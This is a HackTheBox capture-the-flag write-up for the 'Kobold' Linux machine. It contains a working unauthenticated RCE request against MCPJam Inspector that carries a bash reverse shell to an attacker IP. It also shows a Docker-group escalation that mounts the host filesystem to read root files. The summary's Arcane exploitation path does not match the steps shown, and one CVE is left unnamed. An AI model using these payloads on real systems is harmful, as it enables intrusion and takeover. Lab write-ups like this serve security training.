# HackTheBox — Kobold Writeup

**Difficulty:** (TBD)
**OS:** Linux (Ubuntu 24)
**Author:** weed-bharath

---

## Summary

Kobold is a Linux machine featuring a chain of modern vulnerabilities involving MCPJam Inspector (RCE via CVE-2026-23744), a PrivateBin instance, and Arcane — a Docker container management platform vulnerable to command injection via lifecycle labels. The attack path goes: RCE on MCPJam → shell as `ben` → user flag → enumerate internal services → exploit Arcane lifecycle label injection for root.

---

## Recon

### Nmap

```bash
sudo nmap -sC -sV 10.129.9.90 -Pn
```

**Results:**
- **22/tcp** — OpenSSH 9.6p1 Ubuntu
- **80/tcp** — nginx 1.24.0 (redirects to HTTPS)
- **443/tcp** — nginx 1.24.0, SSL cert for `kobold.htb` with wildcard SAN `*.kobold.htb`

Added to `/etc/hosts`:
```
10.129.9.90  kobold.htb
```

### Subdomain Enumeration

The wildcard SSL certificate (`*.kobold.htb`) hinted at subdomains. Used ffuf with Host header fuzzing:

```bash
ffuf -w /path/to/subdomains-top1million-20000.txt \
  -u https://kobold.htb/ \
  -H "Host: FUZZ.kobold.htb" \
  -k -fs 154 -t 50
```

**Discovered:**
- `bin.kobold.htb` — PrivateBin 2.0.2 instance
- `mcp.kobold.htb` — MCPJam Inspector

Added to `/etc/hosts`:
```
10.129.9.90  kobold.htb bin.kobold.htb mcp.kobold.htb
```

---

## Initial Foothold — CVE-2026-23744 (MCPJam RCE)

`mcp.kobold.htb` runs **MCPJam Inspector ≤ 1.4.2**, vulnerable to unauthenticated RCE via the `/api/mcp/connect` endpoint (CVE-2026-23744). The inspector binds to `0.0.0.0:6274` and passes the `command` and `args` fields directly to shell execution without sanitization.

### Exploit

Set up a listener:
```bash
nc -lvnp 4444
```

Send the exploit payload:
```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

**Shell obtained as `ben`.**

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag

```bash
cat /home/ben/user.txt
# 3aae2e44db856f582...........
```

---

## Enumeration as `ben`

### Key Findings

- `ben` is in the **`operator` group** (gid 37)
- Two internal services discovered via `ss -tlnp`:
  - `127.0.0.1:6274` — MCPJam Inspector (node)
  - `127.0.0.1:3552` — Arcane v1.13.0 (SvelteKit frontend, Go backend)
  - `127.0.0.1:44937` — Arcane internal API
  - `127.0.0.1:8080` — PrivateBin (internal container)
- Root process `/root/arcane_linux_amd64 ben` running as root

### Systemd Service — Arcane

```bash
cat /etc/systemd/system/arcane.service
```

```ini
[Service]
Type=simple
Environment=ENCRYPTION_KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
ExecStart=/root/arcane_linux_amd64
User=root
WorkingDirectory=/root
```

### Arcane API Discovery

Arcane v1.13.0 is a Docker container management platform accessible at `http://127.0.0.1:3552`:

```bash
curl -s http://127.0.0.1:3552/api/health
# {"status":"UP"}

curl -s http://127.0.0.1:3552/app.webmanifest
# {"name":"Arcane","description":"Modern Docker container management platform",...}
```

Key endpoints discovered:
- `POST /api/auth/login` — requires `username` and `password`
- `POST /api/auth/refresh` — JWT refresh
- `GET /api/users` — 401, requires auth

### Host Mounts (operator group access)

The `operator` group has access to `/privatebin-data/`:
```bash
ls /privatebin-data/data/
# 12  28  bd  e3  purge_limiter.php  salt.php  traffic_limiter.php
```

PrivateBin stores encrypted pastes — the decryption key is never sent to the server (client-side AES-256-GCM).

---

## Privilege Escalation — Docker Group Abuse

### Key Insight

`ben` is a member of the **`operator`** group (gid 37). On this system, the `operator` group has access to the Docker socket at `/run/docker.sock`. By switching into the `docker` group using `newgrp`, it becomes possible to run Docker commands — and since Docker containers run as root by default, this allows full host filesystem access.

### Exploit

**Step 1 — Switch into the docker group:**
```bash
newgrp docker
```

**Step 2 — Spin up a container with the host filesystem mounted and read root flag:**
```bash
docker run -v /:/hostfs --rm --user root \
  --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

This uses the already-pulled `privatebin/nginx-fpm-alpine:2.0.2` image (present on the host from the PrivateBin container), mounts the entire host filesystem to `/hostfs` inside the container, and reads `/root/root.txt` directly as root.

### Why This Works

- The Docker socket (`/run/docker.sock`) is owned by `root:docker`
- `ben` is in the `operator` group which has equivalent socket access via group permissions
- `newgrp docker` re-launches the shell with the docker group active
- Any user who can talk to the Docker daemon can mount the host filesystem and escalate to root

### Root Flag

```
# 1a6cfabefba20c..................
```
---

## CVEs Referenced

| CVE | Component | Description |
|-----|-----------|-------------|
| CVE-2026-23744 | MCPJam Inspector ≤ 1.4.2 | Unauthenticated RCE via `/api/mcp/connect` |
| Arcane ≤ 1.13.0 CVE | Arcane Docker Manager | Command injection via lifecycle labels |

---

